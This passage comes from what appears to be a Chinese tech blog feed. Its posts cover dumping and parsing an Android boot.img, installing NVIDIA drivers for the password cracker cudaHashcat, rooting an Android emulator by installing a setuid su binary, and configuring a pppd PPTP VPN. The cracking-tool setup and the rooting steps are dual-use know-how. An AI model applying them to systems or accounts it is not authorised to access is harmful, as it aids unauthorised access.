class="hljs-keyword">block</span>/mmcblk0p14<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 system -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p21<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 tz -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p5<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 tzb -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p17<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 userdata -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p23<br></code></pre></td></tr></table></figure><p>哈哈，一清二楚。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/block/mmcblk0p6 of=/sdcard/boot.img bs=4096<br>5632+0 records <span class="hljs-keyword">in</span><br>5632+0 records out<br>23068672 bytes transferred <span class="hljs-keyword">in</span> 2.398 secs (9619963 bytes/sec)<br><br>&gt;./adb pull /sdcard/boot.img /tmp/boot.img<br>4270 KB/s (23068672 bytes <span class="hljs-keyword">in</span> 5.275s)<br></code></pre></td></tr></table></figure><p> boot.img 主要由两部分组成，kernel 和 ramdisk，下面使用010editor来写一个模版，解析boot.img。从Android的源码可以知道boot.img的结构 app&#x2F;aboot&#x2F;bootimg.h</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+-----------------+</span> <br><span class="hljs-section">| boot header     | 1 page</span><br><span class="hljs-section">+-----------------+</span><br><span class="hljs-section">| kernel          | n pages</span><br><span class="hljs-section">+-----------------+</span><br><span class="hljs-section">| ramdisk         | m pages</span><br><span class="hljs-section">+-----------------+</span><br><span class="hljs-section">| second stage    | o pages</span><br><span class="hljs-section">+-----------------+</span><br><span class="hljs-section">| device tree     | p pages</span><br><span class="hljs-section">+-----------------+</span><br></code></pre></td></tr></table></figure><pre><code class="hljs">  boot header 的结构定义如下：</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">boot_img_hdr</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> magic[BOOT_MAGIC_SIZE];<br>    <span class="hljs-type">unsigned</span> kernel_size;  <span class="hljs-comment">/* size in bytes */</span><br>    <span class="hljs-type">unsigned</span> kernel_addr;  <span class="hljs-comment">/* physical load addr */</span><br>    <span class="hljs-type">unsigned</span> ramdisk_size; <span class="hljs-comment">/* size in bytes */</span><br>    <span class="hljs-type">unsigned</span> ramdisk_addr; <span class="hljs-comment">/* physical load addr */</span><br>    <span class="hljs-type">unsigned</span> second_size;  <span class="hljs-comment">/* size in bytes */</span><br>    <span class="hljs-type">unsigned</span> second_addr;  <span class="hljs-comment">/* physical load addr */</span><br>    <span class="hljs-type">unsigned</span> tags_addr;    <span class="hljs-comment">/* physical addr for kernel tags */</span><br>    <span class="hljs-type">unsigned</span> page_size;    <span class="hljs-comment">/* flash page size we assume */</span><br>    <span class="hljs-type">unsigned</span> dt_size;      <span class="hljs-comment">/* device_tree in bytes */</span><br>    <span class="hljs-type">unsigned</span> unused;    <span class="hljs-comment">/* future expansion: should be 0 */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> name[BOOT_NAME_SIZE]; <span class="hljs-comment">/* asciiz product name */</span><br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> cmdline[BOOT_ARGS_SIZE];<br>    <span class="hljs-type">unsigned</span> id[<span class="hljs-number">8</span>]; <span class="hljs-comment">/* timestamp / checksum / sha1 / etc */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="010editor-模板"><a href="#010editor-模板" class="headerlink" title="010editor 模板"></a>010editor 模板</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BOOT_MAGIC_SIZE 8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BOOT_NAME_SIZE 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BOOT_ARGS_SIZE 512</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">boot_img_hdr</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> magic[BOOT_MAGIC_SIZE];<br>    uint kernel_size;  <span class="hljs-comment">/* size in bytes */</span><br>    uint kernel_addr;  <span class="hljs-comment">/* physical load addr */</span><br>    uint ramdisk_size; <span class="hljs-comment">/* size in bytes */</span><br>    uint ramdisk_addr; <span class="hljs-comment">/* physical load addr */</span><br>    uint second_size;  <span class="hljs-comment">/* size in bytes */</span><br>    uint second_addr;  <span class="hljs-comment">/* physical load addr */</span><br>    uint tags_addr;    <span class="hljs-comment">/* physical addr for kernel tags */</span><br>    uint page_size;    <span class="hljs-comment">/* flash page size we assume */</span><br>    uint dt_size;      <span class="hljs-comment">/* device_tree in bytes */</span><br>    uint unused;    <span class="hljs-comment">/* future expansion: should be 0 */</span><br>    ubyte name[BOOT_NAME_SIZE]; <span class="hljs-comment">/* asciiz product name */</span><br>    <br>    ubyte cmdline[BOOT_ARGS_SIZE];<br>    uint id[<span class="hljs-number">8</span>]; <span class="hljs-comment">/* timestamp / checksum / sha1 / etc */</span><br>&#125;BOOT_IMG_HDR;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">boot_hdr</span> &#123;</span><br>    BOOT_IMG_HDR header;<br>    ubyte unused[header.page_size - <span class="hljs-keyword">sizeof</span>(header)];<br>&#125;HEADER;<br><br>LittleEndian();<br>HEADER header_section;<br><br>local uint page_size = header_section.header.page_size;<br>local uint kernel_size = header_section.header.kernel_size;<br>local uint ramdisk_size = header_section.header.ramdisk_size;<br>local uint second_size = header_section.header.second_size;<br><br>Printf(<span class="hljs-string">&quot;page_size: %x\nkernel_size: %x\nramdisk_size: %x\nsecond_size: %x\n&quot;</span>, page_size, kernel_size, ramdisk_size, second_size);<br><br>local uint n = (kernel_size + page_size - <span class="hljs-number">1</span>) / page_size;<br>local uint m = (ramdisk_size + page_size - <span class="hljs-number">1</span>) / page_size; <br>local uint o = (second_size + page_size - <span class="hljs-number">1</span>) / page_size;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kernel</span> &#123;</span><br>    ubyte kernel_data[kernel_size];<br>    ubyte unused[n * page_size - kernel_size];<br>&#125;KERNEL;<br><br>KERNEL kernel_section;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ramdisk</span> &#123;</span><br>    ubyte ramdisk_data[ramdisk_size];<br>    ubyte unused[m * page_size - ramdisk_size];<br>&#125;RAMDISK;<br><br>RAMDISK ramdisk_section;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">second</span> &#123;</span><br>    ubyte second_data[second_size];<br>    ubyte unused[o * page_size - second_size];<br><br>&#125;SECOND;<br><br>SECOND second_section;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在Ubuntu 14.04 上安装 oclHashcat 的方法 (cuda)</title>
    <link href="/cn/ubuntu_cuda_hashcat/"/>
    <url>/cn/ubuntu_cuda_hashcat/</url>
    
    <content type="html"><![CDATA[<p>首先需要下载正确的驱动和软件，下载的软件版本一定要正确。下面的两个链接地址是我实验成功的版本。</p><p>N卡驱动 ：<a href="http://us.download.nvidia.com/XFree86/Linux-x86_64/346.47/NVIDIA-Linux-x86_64-346.47.run">http://us.download.nvidia.com/XFree86/Linux-x86_64/346.47/NVIDIA-Linux-x86_64-346.47.run</a><br>oclHashcat: <a href="https://hashcat.net/files/cudaHashcat-1.35.7z">https://hashcat.net/files/cudaHashcat-1.35.7z</a></p><p>关键是需要ForceWare 346.x或者更新的版本，ForceWare驱动是nVIDIA 系列显卡最新官方版本名称, 估计和AMD的催化剂类似。如果安装驱动的版本不对运行oclhashcat的时候会报 ERROR: cuModuleLoad() 209 错误，排查了较长时间发现是驱动版本不对，340.x的驱动无法正常工作，一定需要 346.x 的驱动。</p><h2 id="基本要求"><a href="#基本要求" class="headerlink" title="基本要求"></a>基本要求</h2><p><a href="http://us.download.nvidia.com/XFree86/Linux-x86_64/346.47/README/index.html">http://us.download.nvidia.com/XFree86/Linux-x86_64/346.47/README/index.html</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">binutils</span>                  <span class="hljs-number">2</span>.<span class="hljs-number">9</span>.<span class="hljs-number">5</span><br><span class="hljs-attribute">GNU</span> make                  <span class="hljs-number">3</span>.<span class="hljs-number">77</span><br><span class="hljs-attribute">gcc</span>                       <span class="hljs-number">2</span>.<span class="hljs-number">91</span>.<span class="hljs-number">66</span><br><span class="hljs-attribute">kernel</span>                    <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">18</span>* and newer<br><span class="hljs-attribute">XFree86</span>                   <span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> and newer<br><span class="hljs-attribute">X</span>.Org                     <span class="hljs-number">1</span>.<span class="hljs-number">0</span>, <span class="hljs-number">1</span>.<span class="hljs-number">1</span>, <span class="hljs-number">1</span>.<span class="hljs-number">2</span>, <span class="hljs-number">1</span>.<span class="hljs-number">3</span>, <span class="hljs-number">1</span>.<span class="hljs-number">4</span>, <span class="hljs-number">1</span>.<span class="hljs-number">5</span>, <span class="hljs-number">1</span>.<span class="hljs-number">6</span>, <span class="hljs-number">1</span>.<span class="hljs-number">7</span>, <span class="hljs-number">1</span>.<span class="hljs-number">8</span>, <span class="hljs-number">1</span>.<span class="hljs-number">9</span>, <span class="hljs-number">1</span>.<span class="hljs-number">10</span>, <span class="hljs-number">1</span>.<span class="hljs-number">11</span>, <span class="hljs-number">1</span>.<span class="hljs-number">12</span>, <span class="hljs-number">1</span>.<span class="hljs-number">13</span>, <span class="hljs-number">1</span>.<span class="hljs-number">14</span>, <span class="hljs-number">1</span>.<span class="hljs-number">15</span>, <span class="hljs-number">1</span>.<span class="hljs-number">16</span>, <span class="hljs-number">1</span>.<span class="hljs-number">17</span><br><span class="hljs-attribute">Kernel</span> modutils           <span class="hljs-number">2</span>.<span class="hljs-number">1</span>.<span class="hljs-number">121</span> and newer<br><span class="hljs-attribute">glibc</span>                     <span class="hljs-number">2</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="一些准备工作"><a href="#一些准备工作" class="headerlink" title="一些准备工作"></a>一些准备工作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install build-essential<br>sudo apt-get install linux-image-extra-virtual<br></code></pre></td></tr></table></figure><p>卸载原有的nvidia的驱动，不然会发生冲突：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-get remove nvidia* &amp;&amp; sudo apt-get autoremove<br>$ sudo apt-get --purge remove xserver-xorg-video-nouveau<br></code></pre></td></tr></table></figure><p>禁用nouveau  (这个是开源的N卡驱动)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo vi /etc/modprobe.d/blacklist-nouveau.conf<br><br>blacklist nouveau<br>blacklist lbm-nouveau<br>options nouveau modeset=0<br><span class="hljs-built_in">alias</span> nouveau off<br><span class="hljs-built_in">alias</span> lbm-nouveau off<br><br>$ <span class="hljs-built_in">echo</span> options nouveau modeset=0 | sudo <span class="hljs-built_in">tee</span> -a /etc/modprobe.d/nouveau-kms.conf<br>$ sudo update-initramfs -u<br>$ sudo reboot<br></code></pre></td></tr></table></figure><p>停用X，不然安装过程会出错。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ sudo service lightdm stop<br></code></pre></td></tr></table></figure><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">chmod</span> +x ./NVIDIA-Linux-x86_64-346.47.run<br>$ sudo ./NVIDIA-Linux-x86_64-346.47.run<br>$ sudo reboot<br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://hashcat.net/oclhashcat/">https://hashcat.net/oclhashcat/</a><br><a href="http://www.nvidia.com/object/unix.html">http://www.nvidia.com/object/unix.html</a><br><a href="http://ubuntuhandbook.org/index.php/2015/01/install-nvidia-346-35-ubuntu-1404/">http://ubuntuhandbook.org/index.php/2015/01/install-nvidia-346-35-ubuntu-1404/</a><br><a href="http://tleyden.github.io/blog/2014/10/25/cuda-6-dot-5-on-aws-gpu-instance-running-ubuntu-14-dot-04/">http://tleyden.github.io/blog/2014/10/25/cuda-6-dot-5-on-aws-gpu-instance-running-ubuntu-14-dot-04/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>root Android emulator</title>
    <link href="/cn/root_android_emulator/"/>
    <url>/cn/root_android_emulator/</url>
    
    <content type="html"><![CDATA[<p>一个的简单的脚本就可以实现自动化root，以下代码在 Android 4.4.2 的 emulator上实验成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo ./adb start-server<br>./adb shell mount -o rw,remount -t yaffs2 /dev/block/mtdblock0 /system<br>./adb push su /system/xbin/su<br>./adb install Superuser.apk<br>./adb shell <span class="hljs-built_in">chmod</span> 06755 /system/xbin/su<br>./adb shell /system/xbin/su -d<br></code></pre></td></tr></table></figure><p>其中涉及的二进制文件都可以从 [2] 下载，最关键的步骤是执行su -d，不执行的话SuperSu会报找不到su的二进制文件。</p><p>关于android 的emulator有个特性，&#x2F;system 下的所有更改在下次重启时会丢失。解决这个问题的方法有很多种，最简单的方法是从tmp目录下拷贝emulator-xxx 文件到avd目录。avd目录默认在 ~&#x2F;.android&#x2F;avd </p><p>&#x2F;tmp&#x2F;android-user&#x2F;emulator-xxxx, 将这个文件重命名为system.img，这样重启后，&#x2F;system下的修改不会丢失。</p><p>[1] <a href="http://www.claudxiao.net/2013/10/persistent-change-emulator-system-partition/">http://www.claudxiao.net/2013/10/persistent-change-emulator-system-partition/</a><br>[2] <a href="http://download.chainfire.eu/589/SuperSU/UPDATE-SuperSU-v2.16.zip">http://download.chainfire.eu/589/SuperSU/UPDATE-SuperSU-v2.16.zip</a><br>[3] <a href="http://stackoverflow.com/questions/15417105/forcing-the-android-emulator-to-store-changes-to-system">http://stackoverflow.com/questions/15417105/forcing-the-android-emulator-to-store-changes-to-system</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fedora 安装pptp vpn</title>
    <link href="/cn/fedora_pptp_vpn/"/>
    <url>/cn/fedora_pptp_vpn/</url>
    
    <content type="html"><![CDATA[<p>  使用NetWorkManger图形界面，可以简单地配置pptp vpn，但是有几个地方不是特别满意</p><ul><li>操作繁琐，需要多次点击鼠标</li><li>拨号后全局生效，要设置路由</li><li>可以配置的参数不是特别多</li><li>不是通用的方法，在终端中使用不方便</li><li>还是比较习惯命令行操作</li></ul><p>基于上面几个原因折腾了一下pppd，用了一段时间非常不错，很稳定，在这里记录配置的方法。使用pppd的方法应该可以在其他Linux的发行版上正常使用，配置文件的路径或许有稍许差别。</p><p>pppd是Point-to-Point Protocol Daemon的缩写，pppd 的源代码托管在GitHub上 <a href="https://github.com/paulusmack/ppp">https://github.com/paulusmack/ppp</a> 可以访问 pppd 的官方网站获取更多信息 <a href="https://ppp.samba.org/pppd.html">https://ppp.samba.org/pppd.html</a></p><h2 id="安装所需要的软件"><a href="#安装所需要的软件" class="headerlink" title="安装所需要的软件"></a>安装所需要的软件</h2><p>首先需要看看哪个包提供了pppd，执行下面的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># yum whatprovides pppd</span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ppp<span class="hljs-number">-2.4</span><span class="hljs-number">.5</span><span class="hljs-number">-33.</span>fc20.x86_64 : The <span class="hljs-type">Point</span>-<span class="hljs-keyword">to</span>-<span class="hljs-type">Point</span> Protocol daemon<br>源    ：fedora<br>匹配来源：<br>文件名    ：/usr/sbin/pppd<br><br>ppp<span class="hljs-number">-2.4</span><span class="hljs-number">.5</span><span class="hljs-number">-33.</span>fc20.x86_64 : The <span class="hljs-type">Point</span>-<span class="hljs-keyword">to</span>-<span class="hljs-type">Point</span> Protocol daemon<br>源    ：@koji-override<span class="hljs-number">-0</span>/$releasever<br>匹配来源：<br>文件名    ：/usr/sbin/pppd<br></code></pre></td></tr></table></figure><h2 id="安装pppd"><a href="#安装pppd" class="headerlink" title="安装pppd"></a>安装pppd</h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"># yum install ppp<span class="hljs-string">-2</span>.4.5<span class="hljs-string">-33</span>.fc20.x86_64<br></code></pre></td></tr></table></figure><p>保证pppd版本高于2.4.2,然后开始修改配置文件。</p><h2 id="设置用户名密码"><a href="#设置用户名密码" class="headerlink" title="设置用户名密码"></a>设置用户名密码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;  vi /etc/ppp/chap-secrets<br><br><span class="hljs-comment"># Secrets for authentication using CHAP</span><br><span class="hljs-comment"># client server secret IP addresses</span><br>user1 PPTP password123 *<br></code></pre></td></tr></table></figure><p>user1        vpn用户名<br>PPTP         后面的文件需要用到，和用户名密码相对应<br>password123  vpn密码</p><h2 id="创建vpn-profile"><a href="#创建vpn-profile" class="headerlink" title="创建vpn profile"></a>创建vpn profile</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; vi /etc/ppp/peers/vpn<br><br>pty <span class="hljs-string">&quot;pptp serverip --nolaunchpppd&quot;</span><br>name user1<br>remotename PPTP<br>require-mppe-128<br>file /etc/ppp/options.pptp<br>ipparam vpn<br></code></pre></td></tr></table></figure><h2 id="连接vpn"><a href="#连接vpn" class="headerlink" title="连接vpn"></a>连接vpn</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; sudo pppd call vpn<br></code></pre></td></tr></table></figure><h2 id="断开vpn"><a href="#断开vpn" class="headerlink" title="断开vpn"></a>断开vpn</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; sudo killall pppd<br></code></pre></td></tr></table></figure><h2 id="设置路由"><a href="#设置路由" class="headerlink" title="设置路由"></a>设置路由</h2><p>成功连接vpn后，发现访问不了需要访问的10.6网段，使用route命令查看路由情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; route -n<br><br>Kernel IP routing table<br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br>0.0.0.0         10.51.255.*   0.0.0.0         UG    1024   0        0 em1<br>10.51.0.0       0.0.0.0         255.255.0.0     U     0      0        0 em1<br>172.16.58.1     0.0.0.0         255.255.255.255 UH    0      0        0 ppp0<br>*.99.*27.1*0  10.51.255.254   255.255.255.255 UGH   0      0        0 em1<br></code></pre></td></tr></table></figure><p>因为需要访问10.6网段,需要添加下面的路由</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; sudo route add -net 10.6.0.0/16 gw 10.58.*.* dev ppp0<br></code></pre></td></tr></table></figure><p>其中10.58.*.*为拨vpn后分配给你的IP地址，这里就有一个问题，每次连接后都需要重新设置路由，比较麻烦，摸索了一翻发现ip-up.local和ip-down.local可以解决这个问题，每次连接成功后会执行ip-up.local脚本，每次断开连接时会执行ip-down.local脚本。我们只要编写这两个脚本就可以自动设置路由，完全自动化，Cool !</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; sudo vi /etc/ppp/ip-up.local<br><br><span class="hljs-comment">#!/bin/bash</span><br><br>NET=<span class="hljs-string">&quot;10.6.0.0/16&quot;</span><br>IFACE=<span class="hljs-string">&quot;ppp0&quot;</span><br>IP=`ip addr show dev <span class="hljs-variable">$&#123;IFACE&#125;</span> | grep <span class="hljs-string">&#x27;inet&#x27;</span> | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>`<br><br>route add -net <span class="hljs-variable">$&#123;NET&#125;</span> gw <span class="hljs-variable">$&#123;IP&#125;</span> dev <span class="hljs-variable">$&#123;IFACE&#125;</span><br><br>&gt; sudo vi /etc/ppp/ip-down.local<br><br><span class="hljs-comment">#!/bin/bash</span><br><br>route del *.99.*27.1*0 dev em1<br><br>&gt; sudo <span class="hljs-built_in">chmod</span> +x /etc/ppp/ip-up.local<br>&gt; sudo <span class="hljs-built_in">chmod</span> +x /etc/ppp/ip-down.local<br></code></pre></td></tr></table></figure><p>重新连接vpn，查看路由情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; sudo pppd call vpn<br>&gt; route -n<br></code></pre></td></tr></table></figure><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">Kernel IP routing table<br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br><span class="hljs-number">0.0.0.0</span>         <span class="hljs-number">10</span>.<span class="hljs-number">51</span>.<span class="hljs-number">255</span>.*   <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         UG    <span class="hljs-number">1024</span>   <span class="hljs-number">0</span>        <span class="hljs-number">0</span> em1<br><span class="hljs-number">10.6.0.0</span>        <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">58</span>.<span class="hljs-number">89</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> ppp0<br><span class="hljs-number">10.51.0.0</span>       <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     U     <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> em1<br><span class="hljs-number">172.16.58.1</span>     <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span> UH    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> ppp0<br>*.<span class="hljs-number">99</span>.*<span class="hljs-number">27</span>.<span class="hljs-number">1</span>*<span class="hljs-number">0</span>  <span class="hljs-number">10</span>.<span class="hljs-number">51</span>.<span class="hljs-number">255</span>.<span class="hljs-number">254</span>   <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span> UGH   <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> em1<br></code></pre></td></tr></table></figure><p>已经自动添加10.6.0.0的路由了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; sudo killall pppd<br>&gt; route -n<br>Kernel IP routing table<br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br>0.0.0.0         10.51.255.*   0.0.0.0         UG    1024   0        0 em1<br>10.51.0.0       0.0.0.0         255.255.0.0     U     0      0        0 em1<br></code></pre></td></tr></table></figure><h2 id="提升速度"><a href="#提升速度" class="headerlink" title="提升速度"></a>提升速度</h2><p>连接上vpn后发现速度很慢，经过研究 novj 选项可以大幅提高速度。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">novj <span class="hljs-keyword">Disable</span> Van Jacobson style TCP/IP <span class="hljs-keyword">header</span> compression <span class="hljs-keyword">in</span> <span class="hljs-keyword">both</span> the transmit <span 